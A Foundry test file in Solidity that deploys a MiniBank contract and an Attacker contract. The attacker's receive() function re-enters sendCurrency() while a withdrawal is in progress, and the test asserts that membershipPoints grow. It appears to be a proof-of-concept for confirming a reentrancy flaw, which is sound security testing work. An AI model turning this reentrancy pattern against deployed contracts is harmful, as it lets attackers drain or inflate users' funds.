
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/MiniBank.sol";

contract TestReentrancyMiniBank is Test {

    MiniBank public _contractUnderTest;

    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MiniBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal < type(uint128).max);

        _contractUnderTest.receiveCurrency{value: attackVal}();

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MiniBank public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    uint256 private attackVal;

    constructor(address victimAddress) {
        victim = MiniBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackVal = val;

        victim.receiveCurrency{value: attackVal}();
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.membershipPoints(address(this));

        victim.sendCurrency();

        if (victim.membershipPoints(address(this)) > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            victim.sendCurrency();
            attackCallCount++;
        }
    }
}
